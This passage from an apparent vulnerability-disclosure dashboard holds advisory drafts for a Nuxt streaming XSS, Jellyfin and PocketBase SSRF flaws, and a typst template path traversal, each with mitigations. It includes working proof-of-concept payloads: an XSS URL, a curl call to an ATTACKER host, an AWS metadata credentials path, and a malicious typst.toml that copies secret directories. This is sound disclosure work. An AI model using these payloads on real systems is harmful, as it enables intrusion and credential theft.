+switches back to normal insertion mode. Content parsed after that point is live DOM,
+not the inert `DocumentFragment` that lives inside a `&lt;template&gt;`. Inline event
+handlers on those elements fire immediately during parsing — before Vue&#x27;s
+`ISLAND_TELEPORT_RELOCATE_SCRIPT` runs, and before any nonce-based CSP can
+intervene (nonces apply to `&lt;script&gt;` elements, not to `onerror`/`onload`).
+
+## Attack Conditions
+
+1. The application has `experimental.ssrStreaming.enabled: true` in `nuxt.config.ts`.
+2. A `*.server.vue` island component exposes a named `&lt;slot&gt;`.
+3. The slot renders user-supplied data via `v-html`.
+
+All three conditions appear in production applications. Nuxt&#x27;s own streaming test
+fixture (`test/fixtures/ssr-streaming/components/IslandWithSlot.server.vue`) uses
+named slots on island components.
+
+## Proof of Concept
+
+```javascript
+// Replicates renderStreamedIslandTeleports from islands.ts:74-96 exactly.
+// Run with: node poc.js
+
+const SSR_SLOT_TELEPORT_MARKER   = /^uid=([^;]*);slot=(.*)$/
+const SSR_CLIENT_TELEPORT_MARKER = /^uid=([^;]*);client=(.*)$/
+
+const ISLAND_TELEPORT_RELOCATE_SCRIPT =
+  `(()=&gt;{for(const t of document.querySelectorAll(&#x27;template[data-island-uid]&#x27;)){` +
+  `const u=t.getAttribute(&#x27;data-island-uid&#x27;),s=t.getAttribute(&#x27;data-island-slot&#x27;),` +
+  `c=t.getAttribute(&#x27;data-island-component&#x27;),` +
+  `a=document.querySelector(&#x27;[data-island-uid=&quot;&#x27;+u+&#x27;&quot;]&#x27;+(s!==null?` +
+  `&#x27;[data-island-slot=&quot;&#x27;+s+&#x27;&quot;]&#x27;:&#x27;[data-island-component=&quot;&#x27;+c+&#x27;&quot;]&#x27;));` +
+  `if(a){a.insertBefore(t.content,a.firstChild)}t.remove()}})()`
+
+function renderStreamedIslandTeleports(ssrContext, nonceAttr = &#x27;&#x27;) {
+  const { teleports, islandContext } = ssrContext
+  if (islandContext || !teleports) return &#x27;&#x27;
+  let templates = &#x27;&#x27;
+  for (const key in teleports) {
+    const matchClientComp = key.match(SSR_CLIENT_TELEPORT_MARKER)
+    if (matchClientComp) {
+      const [, uid, clientId] = matchClientComp
+      if (!uid || !clientId) continue
+      templates += `&lt;template data-island-uid=&quot;${uid}&quot; data-island-component=&quot;${clientId}&quot;&gt;${teleports[key]}&lt;/template&gt;`
+      continue
+    }
+    const matchSlot = key.match(SSR_SLOT_TELEPORT_MARKER)
+    if (matchSlot) {
+      const [, uid, slot] = matchSlot
+      if (!uid || !slot) continue
+      templates += `&lt;template data-island-uid=&quot;${uid}&quot; data-island-slot=&quot;${slot}&quot;&gt;${teleports[key]}&lt;/template&gt;`
+    }
+  }
+  if (!templates) return &#x27;&#x27;
+  return templates + `&lt;script${nonceAttr}&gt;${ISLAND_TELEPORT_RELOCATE_SCRIPT}&lt;/script&gt;`
+}
+
+// Attacker payload — delivered via v-html=&quot;$route.query.comment&quot;
+const payload = &#x27;&lt;/template&gt;&lt;img src=x onerror=&quot;document.title=\&#x27;XSS\&#x27;&quot;&gt;&#x27;
+
+const output = renderStreamedIslandTeleports({
+  teleports: { &#x27;uid=abc123;slot=default&#x27;: `&lt;p&gt;safe content&lt;/p&gt;${payload}` },
+  islandContext: null
+})
+
+console.log(output)
+// → &lt;template ...&gt;&lt;p&gt;safe content&lt;/p&gt;&lt;/template&gt;&lt;img src=x onerror=&quot;...&quot;&gt;&lt;/template&gt;&lt;script&gt;...&lt;/script&gt;
+//                                               ^^^ parser exits template mode here; img is live DOM
+```
+
+Loading the output in a browser sets `document.title` to `&quot;XSS&quot;` before any Vue
+code runs.
+
+**Attack URL** (reflected variant):
+```
+https://example.com/?comment=%3C%2Ftemplate%3E%3Cscript%3Ealert(origin)%3C%2Fscript%3E
+```
+
+## Impact
+
+Arbitrary JavaScript execution in the victim&#x27;s browser context. Full session access
+(cookies, storage, tokens). The XSS is server-rendered into the streaming response
+and affects every user who loads the poisoned page.
+
+## Mitigation
+
+Escape `&lt;/template&gt;` before interpolating teleport content:
+
+```typescript
+function escapeTemplateClose(s: string): string {
+  return s.replace(/&lt;\/template&gt;/gi, &#x27;&lt;\\/template&gt;&#x27;)
+}
+
+// line 91:
+templates += `&lt;template data-island-uid=&quot;${uid}&quot; data-island-slot=&quot;${slot}&quot;&gt;${escapeTemplateClose(teleports[key])}&lt;/template&gt;`
+```
+
+Alternatively, transport teleport content through a Base64-encoded data attribute to
+remove the dependency on HTML parser behaviour entirely.
+</pre></section><section class="card" id="f5"><div class="chead"><div class="ctitle"><span class="sev med">Medium</span><span class="cname">5. SSRF via unfiltered imageUrl in DownloadRemoteImage</span></div><div class="cmeta"><span class="badge tier1">Tier 1</span><span class="badge chan">EMAIL (security@jellyfin.org)</span><button class="copy copyall" data-target="f5-full">Copy entire submission</button></div></div><div class="field"><div class="flabel">Advisory title</div><div class="frow"><pre class="fval" id="f5-title">SSRF via unfiltered imageUrl in DownloadRemoteImage</pre><button class="copy" data-target="f5-title">Copy</button></div></div><div class="field"><div class="flabel">CVE identifier</div><div class="frow"><pre class="fval" id="f5-cve">Request CVE ID later</pre><button class="copy" data-target="f5-cve">Copy</button></div></div><div class="field"><div class="flabel">Severity — CVSS v3.1 vector (6.8, Medium)</div><div class="frow"><pre class="fval" id="f5-cvss">AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N</pre><button class="copy" data-target="f5-cvss">Copy</button></div></div><div class="field"><div class="flabel">Weaknesses (CWE)</div><div class="frow"><pre class="fval" id="f5-cwe">CWE-918</pre><button class="copy" data-target="f5-cwe">Copy</button></div></div><div class="field"><div class="flabel">Ecosystem</div><div class="frow"><pre class="fval" id="f5-eco">NuGet</pre><button class="copy" data-target="f5-eco">Copy</button></div></div><div class="field"><div class="flabel">Package name</div><div class="frow"><pre class="fval" id="f5-pkg">Jellyfin.Server</pre><button class="copy" data-target="f5-pkg">Copy</button></div></div><div class="field"><div class="flabel">Affected versions</div><div class="frow"><pre class="fval" id="f5-aff">&lt;= 10.11.11</pre><button class="copy" data-target="f5-aff">Copy</button></div></div><div class="field"><div class="flabel">Patched versions</div><div class="frow"><pre class="fval" id="f5-patched">None</pre><button class="copy" data-target="f5-patched">Copy</button></div></div><div class="field"><div class="flabel">Description</div><div class="frow"><pre class="fval big" id="f5-desc">## Summary
+
+`POST /Items/{id}/RemoteImages/Download?imageUrl=&lt;url&gt;` passes the caller-supplied
+URL verbatim to `HttpClient.GetAsync` without host validation, allowlist enforcement,
+or SSRF controls. An authenticated administrator can direct the Jellyfin server
+process to make HTTP requests to any reachable host, including link-local metadata
+services, internal APIs, and loopback services. When the response passes the
+content-type check it is persisted as an item image and retrievable via the media
+API, providing a partial-read SSRF oracle.
+
+## Description
+
+The vulnerable path runs through `ProviderManager.SaveImage` at
+`MediaBrowser.Providers/Manager/ProviderManager.cs:192`:
+
+```csharp
+var response = await _httpClientFactory
+    .CreateClient(NamedClient.Default)
+    .GetAsync(url, cancellationToken)
+    .ConfigureAwait(false);
+```
+
+`NamedClient.Default` is configured with a `SocketsHttpHandler` whose
+`ConnectCallback` is `HttpClientExtension.OnConnect` — a HappyEyeballs TCP dialler
+that calls `socket.ConnectAsync(context.DnsEndPoint)` with no IP address inspection.
+There is no allowlist, no RFC-1918 rejection, and no DNS rebinding protection
+anywhere in the call chain.
+
+The content-type check fires after the full response body has been fetched and
+buffered:
+
+```csharp
+if (!response.Content.Headers.ContentType?.MediaType?.StartsWith(&quot;image/&quot;, StringComparison.OrdinalIgnoreCase) ?? true)
+{
+    throw new HttpRequestException(&quot;Content is not an image.&quot;);
+}
+await _imageProcessor.SaveImageAsync(stream, mimeType, path);
+```
+
+For targets that return `Content-Type: image/*` — or via a redirect to a URL that
+does — the body bytes are written to disk and exposed at
+`GET /Items/{id}/Images/Primary`.
+
+## Proof of Concept
+
+```bash
+# Prerequisites: Jellyfin running on :8096, valid admin API key
+
+# 1. Start probe listener
+nc -lvp 18765 &amp;
+
+# 2. Fire SSRF
+curl -s -X POST \
+  &quot;http://localhost:8096/Items/$(curl -s http://localhost:8096/Items?Limit=1 \
+     -H &#x27;Authorization: MediaBrowser Token=&quot;ADMIN_KEY&quot;&#x27; | python3 -c \
+     &quot;import sys,json; print(json.load(sys.stdin)[&#x27;Items&#x27;][0][&#x27;Id&#x27;])&quot;)/RemoteImages/Download?imageUrl=http://ATTACKER:18765/probe&amp;type=Primary&quot; \
+  -H &#x27;Authorization: MediaBrowser Token=&quot;ADMIN_KEY&quot;&#x27;
+
+# 3. Probe listener receives:
+# GET /probe HTTP/1.1
+# Host: ATTACKER:18765
+# User-Agent: Jellyfin-Server/10.11.11   ← confirms server-side request
+```
+
+**AWS IMDSv1 exfiltration** (where applicable):
+```bash
+# imageUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Response is text/plain, so rejected after full read.
+# For endpoints that return image/* content, full body is persisted and retrievable.
+```
+
+## Impact
+
+- Internal network scanning via response timing and status codes.
+- Cloud metadata exfiltration on IMDSv1-enabled instances (AWS, GCP, Azure, DO).
+- Partial response-body read for any internal service returning `image/*` content.
+- Redirect following (50 hops, default) enables traversal across internal services.
+
+Precondition: valid admin credentials or API key. In deployments that share API keys
+across services or where admin credentials are compromised, this provides full
+internal network access from the server&#x27;s network position.
+
+## Mitigation
+
+Resolve the target URL&#x27;s hostname to an IP before opening the TCP connection and
+reject RFC-1918, loopback, and link-local addresses:
+
+```csharp
+// In SocketsHttpHandler ConnectCallback, after DNS resolution:
+var ip = addresses.First();
+if (IPAddress.IsLoopback(ip)
+    || ip.IsInRange(&quot;10.0.0.0/8&quot;)
+    || ip.IsInRange(&quot;172.16.0.0/12&quot;)
+    || ip.IsInRange(&quot;192.168.0.0/16&quot;)
+    || ip.IsInRange(&quot;169.254.0.0/16&quot;))
+{
+    throw new InvalidOperationException(&quot;SSRF: private address rejected&quot;);
+}
+```
+
+Use a dedicated `NamedClient.RemoteImage` with this handler rather than patching
+`NamedClient.Default`.</pre><button class="copy" data-target="f5-desc">Copy</button></div></div><pre class="hidden" id="f5-full">Title: SSRF via unfiltered imageUrl in DownloadRemoteImage
+CVE identifier: Request CVE ID later
+Severity (CVSS v3.1): AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N (6.8, Medium)
+Weaknesses (CWE): CWE-918
+Ecosystem: NuGet
+Package name: Jellyfin.Server
+Affected versions: &lt;= 10.11.11
+Patched versions: None
+
+Description:
+## Summary
+
+`POST /Items/{id}/RemoteImages/Download?imageUrl=&lt;url&gt;` passes the caller-supplied
+URL verbatim to `HttpClient.GetAsync` without host validation, allowlist enforcement,
+or SSRF controls. An authenticated administrator can direct the Jellyfin server
+process to make HTTP requests to any reachable host, including link-local metadata
+services, internal APIs, and loopback services. When the response passes the
+content-type check it is persisted as an item image and retrievable via the media
+API, providing a partial-read SSRF oracle.
+
+## Description
+
+The vulnerable path runs through `ProviderManager.SaveImage` at
+`MediaBrowser.Providers/Manager/ProviderManager.cs:192`:
+
+```csharp
+var response = await _httpClientFactory
+    .CreateClient(NamedClient.Default)
+    .GetAsync(url, cancellationToken)
+    .ConfigureAwait(false);
+```
+
+`NamedClient.Default` is configured with a `SocketsHttpHandler` whose
+`ConnectCallback` is `HttpClientExtension.OnConnect` — a HappyEyeballs TCP dialler
+that calls `socket.ConnectAsync(context.DnsEndPoint)` with no IP address inspection.
+There is no allowlist, no RFC-1918 rejection, and no DNS rebinding protection
+anywhere in the call chain.
+
+The content-type check fires after the full response body has been fetched and
+buffered:
+
+```csharp
+if (!response.Content.Headers.ContentType?.MediaType?.StartsWith(&quot;image/&quot;, StringComparison.OrdinalIgnoreCase) ?? true)
+{
+    throw new HttpRequestException(&quot;Content is not an image.&quot;);
+}
+await _imageProcessor.SaveImageAsync(stream, mimeType, path);
+```
+
+For targets that return `Content-Type: image/*` — or via a redirect to a URL that
+does — the body bytes are written to disk and exposed at
+`GET /Items/{id}/Images/Primary`.
+
+## Proof of Concept
+
+```bash
+# Prerequisites: Jellyfin running on :8096, valid admin API key
+
+# 1. Start probe listener
+nc -lvp 18765 &amp;
+
+# 2. Fire SSRF
+curl -s -X POST \
+  &quot;http://localhost:8096/Items/$(curl -s http://localhost:8096/Items?Limit=1 \
+     -H &#x27;Authorization: MediaBrowser Token=&quot;ADMIN_KEY&quot;&#x27; | python3 -c \
+     &quot;import sys,json; print(json.load(sys.stdin)[&#x27;Items&#x27;][0][&#x27;Id&#x27;])&quot;)/RemoteImages/Download?imageUrl=http://ATTACKER:18765/probe&amp;type=Primary&quot; \
+  -H &#x27;Authorization: MediaBrowser Token=&quot;ADMIN_KEY&quot;&#x27;
+
+# 3. Probe listener receives:
+# GET /probe HTTP/1.1
+# Host: ATTACKER:18765
+# User-Agent: Jellyfin-Server/10.11.11   ← confirms server-side request
+```
+
+**AWS IMDSv1 exfiltration** (where applicable):
+```bash
+# imageUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Response is text/plain, so rejected after full read.
+# For endpoints that return image/* content, full body is persisted and retrievable.
+```
+
+## Impact
+
+- Internal network scanning via response timing and status codes.
+- Cloud metadata exfiltration on IMDSv1-enabled instances (AWS, GCP, Azure, DO).
+- Partial response-body read for any internal service returning `image/*` content.
+- Redirect following (50 hops, default) enables traversal across internal services.
+
+Precondition: valid admin credentials or API key. In deployments that share API keys
+across services or where admin credentials are compromised, this provides full
+internal network access from the server&#x27;s network position.
+
+## Mitigation
+
+Resolve the target URL&#x27;s hostname to an IP before opening the TCP connection and
+reject RFC-1918, loopback, and link-local addresses:
+
+```csharp
+// In SocketsHttpHandler ConnectCallback, after DNS resolution:
+var ip = addresses.First();
+if (IPAddress.IsLoopback(ip)
+    || ip.IsInRange(&quot;10.0.0.0/8&quot;)
+    || ip.IsInRange(&quot;172.16.0.0/12&quot;)
+    || ip.IsInRange(&quot;192.168.0.0/16&quot;)
+    || ip.IsInRange(&quot;169.254.0.0/16&quot;))
+{
+    throw new InvalidOperationException(&quot;SSRF: private address rejected&quot;);
+}
+```
+
+Use a dedicated `NamedClient.RemoteImage` with this handler rather than patching
+`NamedClient.Default`.
+</pre></section><section class="card" id="f6"><div class="chead"><div class="ctitle"><span class="sev med">Medium</span><span class="cname">6. typst init copies an arbitrary directory via unvalidated template.path</span></div><div class="cmeta"><span class="badge tier1">Tier 1</span><span class="badge chan">GHSA / maintainer</span><button class="copy copyall" data-target="f6-full">Copy entire submission</button></div></div><div class="field"><div class="flabel">Advisory title</div><div class="frow"><pre class="fval" id="f6-title">typst init copies an arbitrary directory via unvalidated template.path</pre><button class="copy" data-target="f6-title">Copy</button></div></div><div class="field"><div class="flabel">CVE identifier</div><div class="frow"><pre class="fval" id="f6-cve">Request CVE ID later</pre><button class="copy" data-target="f6-cve">Copy</button></div></div><div class="field"><div class="flabel">Severity — CVSS v3.1 vector (5.5, Medium)</div><div class="frow"><pre class="fval" id="f6-cvss">AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N</pre><button class="copy" data-target="f6-cvss">Copy</button></div></div><div class="field"><div class="flabel">Weaknesses (CWE)</div><div class="frow"><pre class="fval" id="f6-cwe">CWE-22</pre><button class="copy" data-target="f6-cwe">Copy</button></div></div><div class="field"><div class="flabel">Ecosystem</div><div class="frow"><pre class="fval" id="f6-eco">Rust (crates.io)</pre><button class="copy" data-target="f6-eco">Copy</button></div></div><div class="field"><div class="flabel">Package name</div><div class="frow"><pre class="fval" id="f6-pkg">typst-cli</pre><button class="copy" data-target="f6-pkg">Copy</button></div></div><div class="field"><div class="flabel">Affected versions</div><div class="frow"><pre class="fval" id="f6-aff">&lt;= 0.15.0</pre><button class="copy" data-target="f6-aff">Copy</button></div></div><div class="field"><div class="flabel">Patched versions</div><div class="frow"><pre class="fval" id="f6-patched">None</pre><button class="copy" data-target="f6-patched">Copy</button></div></div><div class="field"><div class="flabel">Description</div><div class="frow"><pre class="fval big" id="f6-desc">## Summary
+
+`typst init` reads `template.path` from a package&#x27;s `typst.toml` and passes it
+straight to Rust&#x27;s `Path::join()` with no validation. Because `Path::join()` replaces
+the base when its argument is absolute (and does not normalize `..`), a malicious
+package can set `template.path` to an absolute path (e.g. `/etc`, `~/.ssh`) or a `..`
+chain. `scaffold_project` then copies the entire contents of that directory into the
+user&#x27;s new project directory, disclosing arbitrary files the user can read.
+
+## Affected code
+
+`crates/typst-cli/src/init.rs`, `scaffold_project` (verified at v0.15.0):
+
+```rust
+// line 80
+let template_dir = package_path.join(template.path.as_str());
+if !template_dir.exists() {                       // line 81 — the only guard
+    bail!(&quot;template directory does not exist (at {})&quot;, template_dir.display());
+}
+// lines 85-88
+fs_extra::dir::copy(
+    &amp;template_dir,
+    project_dir,
+    &amp;CopyOptions::new().content_only(true),
+)
+```
+
+`TemplateInfo.path` is an unvalidated `EcoString` (`crates/typst-syntax/src/package.rs:83`,
+`pub path: EcoString,`). `PackageManifest::validate()` (`package.rs:157-183`) checks
+only `name`, `version`, and the optional compiler bound — it never inspects
+`template.path`. The only check before the copy is `template_dir.exists()`, which the
+attacker trivially satisfies.
+
+## Mechanism (verified with a standalone `rustc` program)
+
+```
+join(&quot;/etc&quot;)                              = &quot;/etc&quot;            (absolute replaces base)
+join(&quot;../../../../../../.ssh&quot;)            = &quot;&lt;base&gt;/../../../../../../.ssh&quot;  (NOT normalized; OS resolves at copy)
+join(&quot;template&quot;)                          = &quot;&lt;base&gt;/template&quot; (expected, safe case)
+```
+
+So both an absolute `template.path` and a sufficiently long `..` chain escape the
+package directory.
+
+## The gap
+
+typst already has a robust path sandbox for document compilation — `VirtualPath`
+(`crates/typst-syntax/src/path.rs`) normalizes paths and rejects `..` escapes
+(`PathError::Escapes`). `typst init` bypasses that system entirely, using raw
+`Path::join` + `fs_extra::dir::copy` with no containment.
+
+## Proof of concept (reproduced end-to-end against a real v0.15.0 build)
+
+A local package avoids needing Typst Universe (the `@preview` path hits the identical
+`scaffold_project` sink after download). Staged at
+`~/Library/Application Support/typst/packages/local/evil-template/0.1.0/typst.toml`:
+
+```toml
+[package]
+name = &quot;evil-template&quot;
+version = &quot;0.1.0&quot;
+entrypoint = &quot;main.typ&quot;
+authors = [&quot;x&quot;]
+license = &quot;MIT&quot;
+description = &quot;x&quot;
+
+[template]
+path = &quot;/tmp/poc-review/typst-secret&quot;   # attacker-chosen absolute dir
+entrypoint = &quot;main.typ&quot;
+```
+
+`/tmp/poc-review/typst-secret/` contained `SECRET.txt`, `main.typ`, and
+`subdir/nested.txt`. Run in an empty working dir:
+
+```
+$ typst init @local/evil-template:0.1.0
+Successfully created new project from @local/evil-template:0.1.0 🎉
+
+$ find . -type f
+./evil-template/main.typ
+./evil-template/SECRET.txt          # exfiltrated
+./evil-template/subdir/nested.txt   # nested dir exfiltrated too
+
+$ cat ./evil-template/SECRET.txt
+TOP SECRET - exfiltrated via template.path absolute join
+```
+
+The complete contents of the arbitrary absolute directory (recursively) were copied
+into the victim&#x27;s project — no prompt, no warning, exit 0. The `..` variant
+(`path = &quot;../../../../../../../../tmp/poc-review/typst-secret&quot;`) reproduced
+identically.
+
+## Impact
+
+A malicious template package — published to Typst Universe or installed locally — can
+read the contents of any directory readable by the user running `typst init`:
+`~/.ssh/`, `~/.aws/credentials`, `~/.gnupg/`, app config with API keys, etc. The
+contents land in the new project dir (and, since `content_only(true)`, directly at its
+top level). The attack is victim-initiated — the user must run `typst init` against
+the attacker&#x27;s template — which the Typst ecosystem&#x27;s &quot;start from a community
+template&quot; workflow makes plausible. Impact is local file/dir **disclosure**, not write
+or RCE.
+
+## Suggested fix
+
+Validate `template.path` before joining/copying — reject absolute paths and `..`, then
+confirm containment via `canonicalize()` + `starts_with(package_path)`:
+
+```rust
+let p = Path::new(template.path.as_str());
+if p.is_absolute() || template.path.contains(&quot;..&quot;) {
+    bail!(&quot;template path must be a relative path within the package&quot;);
+}
+let template_dir = package_path.join(p);
+let (ct, cp) = (template_dir.canonicalize()?, package_path.canonicalize()?);
+if !ct.starts_with(&amp;cp) {
+    bail!(&quot;template path escapes package directory&quot;);
+}
+```
+
+Alternatively, route the template path through the existing `VirtualPath` sandbox so
+`typst init` inherits the same escape protection as document compilation.</pre><button class="copy" data-target="f6-desc">Copy</button></div></div><pre class="hidden" id="f6-full">Title: typst init copies an arbitrary directory via unvalidated template.path
+CVE identifier: Request CVE ID later
+Severity (CVSS v3.1): AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (5.5, Medium)
+Weaknesses (CWE): CWE-22
+Ecosystem: Rust (crates.io)
+Package name: typst-cli
+Affected versions: &lt;= 0.15.0
+Patched versions: None
+
+Description:
+## Summary
+
+`typst init` reads `template.path` from a package&#x27;s `typst.toml` and passes it
+straight to Rust&#x27;s `Path::join()` with no validation. Because `Path::join()` replaces
+the base when its argument is absolute (and does not normalize `..`), a malicious
+package can set `template.path` to an absolute path (e.g. `/etc`, `~/.ssh`) or a `..`
+chain. `scaffold_project` then copies the entire contents of that directory into the
+user&#x27;s new project directory, disclosing arbitrary files the user can read.
+
+## Affected code
+
+`crates/typst-cli/src/init.rs`, `scaffold_project` (verified at v0.15.0):
+
+```rust
+// line 80
+let template_dir = package_path.join(template.path.as_str());
+if !template_dir.exists() {                       // line 81 — the only guard
+    bail!(&quot;template directory does not exist (at {})&quot;, template_dir.display());
+}
+// lines 85-88
+fs_extra::dir::copy(
+    &amp;template_dir,
+    project_dir,
+    &amp;CopyOptions::new().content_only(true),
+)
+```
+
+`TemplateInfo.path` is an unvalidated `EcoString` (`crates/typst-syntax/src/package.rs:83`,
+`pub path: EcoString,`). `PackageManifest::validate()` (`package.rs:157-183`) checks
+only `name`, `version`, and the optional compiler bound — it never inspects
+`template.path`. The only check before the copy is `template_dir.exists()`, which the
+attacker trivially satisfies.
+
+## Mechanism (verified with a standalone `rustc` program)
+
+```
+join(&quot;/etc&quot;)                              = &quot;/etc&quot;            (absolute replaces base)
+join(&quot;../../../../../../.ssh&quot;)            = &quot;&lt;base&gt;/../../../../../../.ssh&quot;  (NOT normalized; OS resolves at copy)
+join(&quot;template&quot;)                          = &quot;&lt;base&gt;/template&quot; (expected, safe case)
+```
+
+So both an absolute `template.path` and a sufficiently long `..` chain escape the
+package directory.
+
+## The gap
+
+typst already has a robust path sandbox for document compilation — `VirtualPath`
+(`crates/typst-syntax/src/path.rs`) normalizes paths and rejects `..` escapes
+(`PathError::Escapes`). `typst init` bypasses that system entirely, using raw
+`Path::join` + `fs_extra::dir::copy` with no containment.
+
+## Proof of concept (reproduced end-to-end against a real v0.15.0 build)
+
+A local package avoids needing Typst Universe (the `@preview` path hits the identical
+`scaffold_project` sink after download). Staged at
+`~/Library/Application Support/typst/packages/local/evil-template/0.1.0/typst.toml`:
+
+```toml
+[package]
+name = &quot;evil-template&quot;
+version = &quot;0.1.0&quot;
+entrypoint = &quot;main.typ&quot;
+authors = [&quot;x&quot;]
+license = &quot;MIT&quot;
+description = &quot;x&quot;
+
+[template]
+path = &quot;/tmp/poc-review/typst-secret&quot;   # attacker-chosen absolute dir
+entrypoint = &quot;main.typ&quot;
+```
+
+`/tmp/poc-review/typst-secret/` contained `SECRET.txt`, `main.typ`, and
+`subdir/nested.txt`. Run in an empty working dir:
+
+```
+$ typst init @local/evil-template:0.1.0
+Successfully created new project from @local/evil-template:0.1.0 🎉
+
+$ find . -type f
+./evil-template/main.typ
+./evil-template/SECRET.txt          # exfiltrated
+./evil-template/subdir/nested.txt   # nested dir exfiltrated too
+
+$ cat ./evil-template/SECRET.txt
+TOP SECRET - exfiltrated via template.path absolute join
+```
+
+The complete contents of the arbitrary absolute directory (recursively) were copied
+into the victim&#x27;s project — no prompt, no warning, exit 0. The `..` variant
+(`path = &quot;../../../../../../../../tmp/poc-review/typst-secret&quot;`) reproduced
+identically.
+
+## Impact
+
+A malicious template package — published to Typst Universe or installed locally — can
+read the contents of any directory readable by the user running `typst init`:
+`~/.ssh/`, `~/.aws/credentials`, `~/.gnupg/`, app config with API keys, etc. The
+contents land in the new project dir (and, since `content_only(true)`, directly at its
+top level). The attack is victim-initiated — the user must run `typst init` against
+the attacker&#x27;s template — which the Typst ecosystem&#x27;s &quot;start from a community
+template&quot; workflow makes plausible. Impact is local file/dir **disclosure**, not write
+or RCE.
+
+## Suggested fix
+
+Validate `template.path` before joining/copying — reject absolute paths and `..`, then
+confirm containment via `canonicalize()` + `starts_with(package_path)`:
+
+```rust
+let p = Path::new(template.path.as_str());
+if p.is_absolute() || template.path.contains(&quot;..&quot;) {
+    bail!(&quot;template path must be a relative path within the package&quot;);
+}
+let template_dir = package_path.join(p);
+let (ct, cp) = (template_dir.canonicalize()?, package_path.canonicalize()?);
+if !ct.starts_with(&amp;cp) {
+    bail!(&quot;template path escapes package directory&quot;);
+}
+```
+
+Alternatively, route the template path through the existing `VirtualPath` sandbox so
+`typst init` inherits the same escape protection as document compilation.
+</pre></section><section class="card" id="f7"><div class="chead"><div class="ctitle"><span class="sev med">Medium</span><span class="cname">7. SSRF via JSVM $http.send (no egress filtering)</span></div><div class="cmeta"><span class="badge tier1">Tier 1</span><span class="badge chan">EMAIL (support@pocketbase.io)</span><button class="copy copyall" data-target="f7-full">Copy entire submission</button></div></div><div class="field"><div class="flabel">Advisory title</div><div class="frow"><pre class="fval" id="f7-title">SSRF via JSVM $http.send (no egress filtering)</pre><button class="copy" data-target="f7-title">Copy</button></div></div><div class="field"><div class="flabel">CVE identifier</div><div class="frow"><pre class="fval" id="f7-cve">Request CVE ID later</pre><button class="copy" data-target="f7-cve">Copy</button></div></div><div class="field"><div class="flabel">Severity — CVSS v3.1 vector (6.8, Medium)</div><div class="frow"><pre class="fval" id="f7-cvss">AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N</pre><button class="copy" data-target="f7-cvss">Copy</button></div></div><div class="field"><div class="flabel">Weaknesses (CWE)</div><div class="frow"><pre class="fval" id="f7-cwe">CWE-918</pre><button class="copy" data-target="f7-cwe">Copy</button></div></div><div class="field"><div class="flabel">Ecosystem</div><div class="frow"><pre class="fval" id="f7-eco">Go</pre><button class="copy" data-target="f7-eco">Copy</button></div></div><div class="field"><div class="flabel">Package name</div><div class="frow"><pre class="fval" id="f7-pkg">github.com/pocketbase/pocketbase</pre><button class="copy" data-target="f7-pkg">Copy</button></div></div><div class="field"><div class="flabel">Affected versions</div><div class="frow"><pre class="fval" id="f7-aff">v0.39.4 (commit 507ecb26) and earlier</pre><button class="copy" data-target="f7-aff">Copy</button></div></div><div class="field"><div class="flabel">Patched versions</div><div class="frow"><pre class="fval" id="f7-patched">None</pre><button class="copy" data-target="f7-patched">Copy</button></div></div><div class="field"><div class="flabel">Description</div><div class="frow"><pre class="fval big" id="f7-desc">&gt; **Provenance.** Reproduced by execution in the verification run (a JSVM hook
+&gt; calling `$http.send` reached a loopback listener and returned the secret body).
+&gt; Source anchors below were **re-confirmed against the v0.39.4 tree**
+&gt; (commit `507ecb26`): `$http.send` executes via Go&#x27;s `http.DefaultClient` with no
+&gt; egress filtering, while the SSRF-hardened `safeHTTPClient` exists but is wired
+&gt; exclusively into the OAuth2 avatar-fetch path.
+
+## Summary
+
+PocketBase&#x27;s JavaScript VM (the `pb_hooks/*.pb.js` hooks runtime) exposes an
+`$http.send()` binding that performs outbound HTTP requests from the server process.
+This binding applies **no egress filtering** — no allowlist, no RFC-1918/loopback/
+link-local rejection, no DNS-rebinding protection. PocketBase already ships a
+hardened `safeHTTPClient` that blocks requests to private/internal addresses, but it
+is wired **only into the OAuth2 avatar-fetch path**, not into the general-purpose
+`$http.send` binding. A hook that issues `$http.send` to an internal target therefore
+reaches loopback services, cloud metadata endpoints, and internal APIs from the
+server&#x27;s network position, and can return the response body back into application
+logic for exfiltration.
+
+## Root cause
+
+The `$http` object is registered in the JSVM bindings at
+`plugins/jsvm/binds.go:890` (`vm.Set(&quot;$http&quot;, obj)`, inside `BindHTTP` at
+`binds.go:888`); `send` is registered at `binds.go:924`. The URL comes straight from
+the caller-controlled `params[&quot;url&quot;]` (`binds.go:945-947`) and the request is executed
+with **Go&#x27;s stdlib default client** — no destination inspection:
+
+```go
+// plugins/jsvm/binds.go:987-1002
+req, err := http.NewRequestWithContext(ctx, strings.ToUpper(config.Method), config.Url, reqBody)
+// ... headers ...
+res, err := http.DefaultClient.Do(req)   // binds.go:1002 — default transport, no Control dialer, no IP checks
+```
+
+The SSRF-hardened client exists — `safeHTTPClient()` at
+`apis/record_auth_with_oauth2.go:437` uses a `net.Dialer.Control` hook that rejects
+loopback, unspecified, RFC-1918 private, link-local (`169.254.0.0/16` via
+`IsLinkLocalUnicast`), and multicast IPs *after* connect (also defeating DNS
+rebinding):
+
+```go
+// apis/record_auth_with_oauth2.go:452-459
+if ip == nil || ip.IsLoopback() || ip.IsUnspecified() || ip.IsPrivate() ||
+    ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() || ip.IsMulticast() {
+    return fmt.Errorf(&quot;address %q is invalid or resolve to disallowed IP&quot;, address)
+}
+```
+
+But it is wired in **only** at the OAuth2 avatar path: `safeHTTPClient()` is called
+solely from `safeFileFromURL` (`record_auth_with_oauth2.go:484/490`), which is invoked
+only at `record_auth_with_oauth2.go:306` (`safeFileFromURL(ctx, e.OAuth2User.AvatarURL)`).
+A tree-wide grep finds **no** `safeHTTPClient`/`safeFileFromURL` usage anywhere under
+`plugins/jsvm/`. `$http.send` is therefore unprotected.
+
+&gt; A prior pass mistakenly marked this &quot;Clean&quot; on the assumption that `safeHTTPClient`
+&gt; covered `$http.send`. That assumption is wrong — the safe client is scoped to OAuth2
+&gt; avatars; `$http.send` uses `http.DefaultClient`.
+
+## Threat model / precondition (read this — it sets PR:H)
+
+There is **no remote API to create or edit hooks** in PocketBase. To place a
